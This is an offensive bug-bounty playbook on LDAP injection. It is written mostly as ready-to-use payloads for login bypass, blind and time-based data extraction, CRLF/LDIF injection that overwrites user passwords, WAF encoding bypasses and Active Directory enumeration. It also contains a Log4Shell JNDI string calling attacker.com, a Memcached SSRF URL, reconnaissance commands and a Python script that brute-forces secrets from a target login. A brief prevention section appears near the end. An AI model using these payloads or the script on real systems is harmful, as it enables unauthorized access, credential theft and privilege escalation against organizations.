*Navigation: [🏠 Home](../../Hunting%20Approach%20Guide.md) | [⬅️ Layer 2: Element Testing](../../Element%20Testing%20Checklist.md) | [⬅️ Layer 3: Vulnerability Staging](../../Vulnerability_Staging.md)*

# LDAP Injection : Master Playbook

> **The Corporate Organization Chart Analogy**: Imagine a company has a massive digital Rolodex (LDAP). You ask the secretary, "Give me the phone number for anyone named 'John' AND who is in the 'Accounting' department." LDAP Injection is when you trick the secretary into ignored the 'Accounting' part and just handing you the boss's private cell phone number instead.

---

## 0. Exploit Selection Search Tree

```mermaid
graph TD
    Start{{"LDAP Search Tree"}} --> A("Scenario A: Login bypass / password bypass?")
    Start --> B("Scenario B: Suspect Wildcard Injection?")
    Start --> C("Scenario C: Blind Data Extraction?")
    Start --> D("Scenario D: Port 389/636 Open / Recon?")
    Start --> E("Scenario E: Windows / Active Directory?")
    Start --> F("Scenario F: JNDI / Log4j Injection?")
    Start --> G("Scenario G: Business Logic / SSO Bypasses?")
    Start --> H("Scenario H: Time-Based Blind Injection?")
    Start --> I("Scenario I: AD OID / Bitwise Extraction?")
    Start --> J("Scenario J: Attribute Smuggling / LDIF Modify?")
    Start --> K("Scenario K: WAF Bypasses / Encoding?")

    A --> A1("[[#6.1 Authentication Bypass]]")
    B --> B1("[[#5.1 Testing for Wildcard Injection]]")
    C --> C1("[[#6.2 Blind Data Extraction]]")
    D --> D1("[[#7.1 Anonymous LDAP Binding]]")
    E --> E1("[[#9.1 Active Directory (AD) Specifics]]")
    F --> F1("[[#9.2 JNDI / Log4j Injection]]")
    G --> G1("[[#9.3 Business Logic & SSO Bypasses]]")
    H --> H1("[[#9.9 God: Time-Based Blind LDAP Injection]]")
    I --> I1("[[#9.8 God: Active Directory OID & Bitwise Extraction]]")
    J --> J1("[[#9.10 Grandmaster: LDIF Modify Injection (Attribute Smuggling)]]")
    K --> K1("[[#8. WAF Bypasses & Encoding]]")
```



*   **1. Scenario A: Login form uses LDAP and you want to bypass the password?**
    *   Target: [[#6.1 Authentication Bypass]].
*   **2. Scenario B: You found a parameter like `user=john` and suspect LDAP?**
    *   Target: [[#5.1 Testing for Wildcard Injection]].
*   **3. Scenario C: Responses are identical, but you need to leak a password?**
    *   Target: [[#6.2 Blind Data Extraction]].
*   **4. Scenario D: Found port 389/636 open and want to map the network?**
    *   Target: [[#7.1 Anonymous LDAP Binding]].
*   **5. Scenario E: Testing a Windows Domain Controller environment?**
    *   Target: [[#9.1 Active Directory (AD) Specifics]].
*   **6. Scenario F: Need to turn LDAP/JNDI into a full server takeover?**
    *   Target: [[#9.2 JNDI / Log4j Injection]].
*   **7. Scenario G: Suspect the server uses LDAP for Business Logic or SSO?**
    *   Target: [[#9.3 Business Logic & SSO Bypasses]].
*   **8. Scenario H: Response never changes, but need to extract data?**
    *   Target: [[#9.9 God: Time-Based Blind LDAP Injection]].
*   **9. Scenario I: Need to check for nested Domain Admin membership?**
    *   Target: [[#9.8 God: Active Directory OID & Bitwise Extraction]].
*   **10. Scenario J: Can update your profile and want to smuggle attributes?**
    *   Target: [[#9.10 Grandmaster: LDIF Modify Injection (Attribute Smuggling)]].
*   **11. Scenario K: WAF is blocking standard `*` characters?**
    *   Target: [[#8. WAF Bypasses & Encoding]].

---

## 1. Why It Happens & Hunter Questions

### 1.1 First-Principles: What is LDAP?
LDAP (Lightweight Directory Access Protocol) is the "Identity Glue" of the enterprise. It’s used to store and search for users, groups, devices, and permissions across a network. Vulnerabilities occur when an application builds a search query (a "filter") by directly pasting your input into it.

### 1.2 The Hunter's Mindset
If you are new to this, ask these "First Contact" questions:
*   [ ] Does the company use **Single Sign-On (SSO)**? (Usually backed by LDAP).
*   [ ] Does the login page look "Corporate" or mention "Active Directory"?
*   [ ] Are there ports like **389 (LDAP)** or **636 (LDAPS)** open on their servers?
*   [ ] Does the application have a "User Search" or "Employee Directory" feature?

---

## 2. Methodology & UX Impact Table

| Attack Vector | Beginner "Why" | Success Indicator | Bounty Range |
| :--- | :--- | :--- | :--- |
| **Auth Bypass** | Tricking the "Rolodex" to say "Yes" even if the password is wrong. | Successful login to an account without the right credentials. | **P1 - P2 ($1.5k - $3k)** |
| **Attribute Leak** | Forcing the server to reveal a user's department, email, or password. | Seeing sensitive data (e.g. `userPassword`) in the response. | **P1 ($2k+)** |
| **Anon Binding** | Walking through the front door because nobody locked it. | Listing every user and group in the company without a password. | **P2 ($1k - $2k)** |
| **NTLM Relay** | Tricking the LDAP backend into sending its password hash to you. | Receiving a NetNTLM hash in Responder. | **P1 ($3k - $5k)** |
| **RCE (via JNDI)** | Telling the server to "Download and run this" through LDAP. | A reverse shell or command execution on the target. | **P1 (Critical!)** |
| **LDIF Smuggling** | Rewriting directory attributes via profile update fields. | Password changed or admin privileges gained. | **P1 - P2 ($2k - $4k)** |
| **Business Logic** | Changing parameters like `role` or `status` stored in LDAP. | Escalating privileges to Admin or activating a deactivated account. | **P2 ($1.5k+)** |

---

## 3. Hidden Contexts & Identification

### 3.1 Where to Look
*   **Enterprise Logins**: Portals using Windows credentials.
*   **User Search Bars**: Finding people in the organization.
*   **Administrative Filters**: Systems that filter resources based on "Group Membership".
*   **API Parameters**: Look for param names like `uid`, `cn`, `dn`, `group`, or `department`.

### 3.2 Identification Triggers
Inject these "Troublemaker" characters and look for errors or logic changes:
*   `*` (The Wildcard - "Show me everything")
*   `(` and `)` (The Logic Brackets)
*   `&` (The "AND" operator)
*   `|` (The "OR" operator)
*   `!` (The "NOT" operator)

---

## 4. The LDAP Toolbox

*   **NetExec (nxc)**: The "Swiss Army Knife" for Active Directory and LDAP scanning.
*   **ldapsearch**: The standard command-line tool for querying LDAP.
*   **Responder**: Essential for capturing NetNTLM hashes triggered by LDAP Referrals.
*   **ldapdomaindump**: For dumping the entire Active Directory structure into readable HTML/CSV via LDAP.
*   **Burp Suite (Intruder)**: For high-speed character guessing (Blind Injection).
*   **JNDI-Exploit-Kit**: For turning JNDI/Log4j into remote control.

---

## 5. Triage & Identification

### 5.1 Testing for Wildcard Injection
If you find a search bar for users, try entering a single `*`.
*   **Result**: If it returns *every* user in the database, the filter is likely `(uid=*)`.
*   **Indicator**: Successful data leak via logic manipulation.

### 5.2 The "Error" Probe
Inject `*)( &` into a field.
*   **LDAP Success**: If the application crashes or gives a specific "LDAP filter" error, you've confirmed LDAP is used.
*   **Comparison**: This is different from `' or 1=1` which is used for SQLi or XPath.

---

## 6. Core Exploitation (Heritage Restoration)

### 6.1 Authentication Bypass
Tricking the server into ignoring the password check.
*   **Filter Anatomy**: `(&(uid=admin)(password=SECRET))`
*   **Payload (Username field)**: `admin)(&)`
*   **The Resulting Query**: `(&(uid=admin)(&))(password=SECRET)`
*   **Why it works**: LDAP only cares about the first set of completed parenthesis. By injecting `)(&)`, you close the username part and make the whole query "valid" regardless of what is in the password field.

### 6.2 Blind Data Extraction
When the server doesn't show you data, but tells you if a user "Exists" or not.
*   **Scenario**: You want the admin's description or password.
*   **Probe 1 (Existence)**: `admin*)(description=*)`
    *   *Success*: Response says "User Found". (Confirmed `description` field exists).
*   **Probe 2 (Character Guessing)**: `admin*)(description=a*)`
    *   *Result*: "Not found" (The description doesn't start with 'a').
*   **Probe 3**: `admin*)(description=b*)`
    *   *Result*: "User Found" (The first letter is 'b').
*   **Loop**: Repeat for every character until you reconstruct the whole secret.

---

## 7. Unauthenticated Access

### 7.1 Anonymous LDAP Binding
Some servers are configured to let *anyone* ask for information without a password.
*   **The Test (NetExec)**:
    ```bash
    nxc ldap <Target_IP> -u '' -p '' --users --groups
    ```
*   **The Result**: If you get a list of users, you have found "Anonymous Bind" – a major security finding!

### 7.2 Nmap Recon
```bash
nmap --script ldap-search <target>
```
> **Tip for Newbies**: This script checks if the server will talk to you without any credentials and dumps everything it knows about the network.

---

## 8. WAF Bypasses & Encoding

If the character `*` or `(` is blocked, try these "Masking" techniques:
*   **URL Encoding**: `*` -> `%2a`, `(` -> `%28`, `)` -> `%29`.
*   **Double Encoding**: `*` -> `%252a`.
*   **Null Byte**: `admin%00` (Sometimes tricks older parsers).

---

## 9. Specialized Contexts

### 9.1 Active Directory (AD) Specifics
LDAP is the heart of Active Directory. Use it to map the target network:
*   **Find Admins**: `(&(objectClass=user)(adminCount=1))`
*   **Find Computers**: `(objectClass=computer)`
*   **Find Passwords in Descriptions**: `(description=*password*)`

### 9.2 JNDI / Log4j Injection
The legendary Log4shell vulnerability used LDAP to take over servers.
*   **The Payload**: `${jndi:ldap://attacker.com/Exploit}`
*   **How it works**: You send this string in a User-Agent or Search field. The server's logger sees it, tries to "lookup" the LDAP address, and downloads a malicious piece of code from the attacker.

### 9.3 Business Logic & SSO Bypasses
LDAP often carries "Decision Flags" like `isAdmin=TRUE` or `accountStatus=ACTIVE`.
*   **The Attack**: Manipulate parameters to change these flags. Look for values like `ON`, `CN`, `DN`, `UID`.
*   **Logic Leak**: Register a user with `admin*` to see if the system merges your account with a privileged one.

### 9.4 Memcached-via-LDAP (Advanced SSRF)
In some Cloud environments, you can use an LDAP URL wrapper to talk to internal services.
*   **Payload**: `ldap://localhost:11211/%0astats%0aquit`
*   **Impact**: Leaking internal memory/statistics from a Memcached server.

### 9.5 Apex: LDAP Referrals & NTLM Relaying
If you can manipulate the LDAP filter to return an LDAP Referral (a pointer to another LDAP server), you can force the target Windows server to authenticate to an attacker-controlled machine.
*   **The Attack**: You inject an LDAP search filter that triggers the backend to chase a referral to your server (e.g., Responder).
*   **Impact**: The server hands over its NetNTLM hash, which can be relayed to take over the domain or cracked offline.

### 9.6 Apex: Second-Order LDAP Sync Attacks
Modern environments (like HR platforms or IAM tools) often sync user data from a standard SQL database into an LDAP directory via nightly batch files.
*   **The Attack**: You register an account or update your profile description in the SQL-backed web portal with `*)(|uid=*`. It is stored safely in SQL.
*   **The Trigger**: Hours later, the sync script pulls your description and concatenates it into an LDAP query to create/update your LDAP object, triggering the injection.
*   **Impact**: Bypassing perimeter WAFs and exploiting internal IAM sync servers asynchronously.

### 9.7 Apex: Framework-Specific (Spring Data LDAP)
Modern ODMs (Object-Document Mappers) like Spring Data process LDAP queries differently than raw C/PHP applications.
*   **The Bypass**: Spring Data LDAP includes `LdapQueryBuilder`. If developers use the `.filter()` method directly with user input, it acts exactly like raw injection.
*   **Quirks**: Spring sometimes handles backslashes (`\`) weirdly. If standard injections fail, try escaping your payload: `\2a` instead of `*` or `\28` instead of `(`.

### 9.8 God: Active Directory OID & Bitwise Extraction
In Active Directory (AD), you can use **Matching Rule OIDs** to perform complex logical queries that are impossible with standard LDAP filters.
*   **Nested Group Lookup (OID: `1.2.840.113556.1.4.1941`)**: 
    - **Payload**: `admin*)(memberof:1.2.840.113556.1.4.1941:=cn=Domain Admins,ou=Groups,dc=example,dc=com`
    - **Impact**: Tells you if a user is a Domain Admin, even if they are nested 10 groups deep.
*   **Bitwise Filter (OID: `1.2.840.113556.1.4.803`)**: 
    - **Goal**: Extract specific flags from `userAccountControl` (e.g., Is the account disabled? Is the password never-expiring?).
    - **Payload**: `admin*)(userAccountControl:1.2.840.113556.1.4.803:=65536)` (Checks if 'Password Never Expires' is set).

### 9.9 God: Time-Based Blind LDAP Injection
When the application response (body and status code) is 100% identical regardless of the query result, use time-based delays via **Recursive Wildcarding**.
*   **The Technique**: Abuse the expensive "Short-Circuit" evaluation of the LDAP engine.
*   **The Payload**: `(&(uid=admin)(description=a*)(description=*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*))`
*   **How it Works**: 
    - If `description` starts with `a`, the engine proceeds to the second, computationally expensive wildcard match, causing a **3-5 second delay**.
    - If `description` does NOT start with `a`, the engine stops immediately (**0.1 seconds**).
*   **Extraction**: Use this to leak passwords/secrets blindly based on the "Stutter" of the server.

### 9.10 Grandmaster: LDIF Modify Injection (Attribute Smuggling)
Search Filter injection is about *Reading*. LDIF injection is about *Writing/Modifying* the directory.
*   **The Scenario**: An application allows profile updates (e.g., changing your 'Phone Number') and builds an LDIF file internally to update the LDAP entry.
*   **The Attack (CRLF Injection)**: Smuggling new attributes into the update stream.
*   **Payload**: `555-1234%0d%0achangetype:%20modify%0d%0aadd:%20userPassword%0d%0auserPassword:%20Hacked123!`
*   **Impact**: Changing the password of any user or escalating your own privileges (e.g., adding yourself to `Domain Admins`).

---

## 10. High-Speed Automation Pipeline

### 10.1 Professional Blind Extraction Skeleton (Python)
When automated tools fail or are blocked by WAFs, use this custom synchronous script to extract data character-by-character.
```python
import requests
import string

url = "http://target.com/login"
chars = string.ascii_letters + string.digits + "!@#$%^&_-"

def check(payload):
    # Adjust for your target (Form data, JSON, Headers)
    data = {"username": f"admin*)(description={payload}*", "password": "a"}
    res = requests.post(url, data=data)
    return "User Found" in res.text # Adjust success indicator

extracted = ""
for i in range(50): # Max length
    for c in chars:
        if check(extracted + c):
            extracted += c
            print(f"[*] Found so far: {extracted}")
            break
    else:
        print("[+] Extraction complete!")
        break
```

---

## 11. War Stories & Bounty Insights

### 11.1 VPN Gateway Logic Bypasses
Many enterprise VPN gateways (Pulse Secure, Fortinet) utilize LDAP for group-based access control.
*   **The Bug**: In some versions, an attacker could log in with a valid low-privileged username but inject an OR condition into the group check.
*   **Real World**: `username=victim_user)(|(memberOf=cn=VPNAdmins,...)`. 
*   **Bounty Insight**: This bypasses 100% of the MFA logic because the system believes the user is already authenticated and is simply checking permissions.

### 11.2 Cloud-to-Ground Sync Delays
In hybrid environments, user data often flows from an HR platform (SQL-based) to an internal Active Directory (LDAP-based) via automated sync jobs.
*   **The Trap**: A hunter found that updating their "Last Name" to `User*)(description=Hacked*)` in the web portal caused no immediate error. 
*   **The Win**: 24 hours later, the internal sync script failed, crashing a domain controller or leaking sensitive service account descriptions into the web portal's logs because of the overnight batch update.

---

## 12. Prevention (For Developers)

*   **Sanitize All Inputs**: Use specialized LDAP libraries that automatically "Escape" troublemaker characters like `*`, `(`, and `)`.
*   **Disable Anonymous Bind**: Never allow users to query the directory without a valid account.
*   **Use Parameterized Queries**: Just like SQL, modern frameworks support safe ways to bind variables into LDAP filters.

---

## 12. Reference & Resources
*   [LDAP Injection Prevention (OWASP)](https://owasp.org/www-community/attacks/LDAP_Injection)
*   [PayloadsAllTheThings - LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
*   [HackTricks - LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)

*Navigation: [🏠 Home](../../Hunting%20Approach%20Guide.md) | [⬅️ Layer 2: Element Testing](../../Element%20Testing%20Checklist.md) | [⬅️ Layer 3: Vulnerability Staging](../../Vulnerability_Staging.md)*
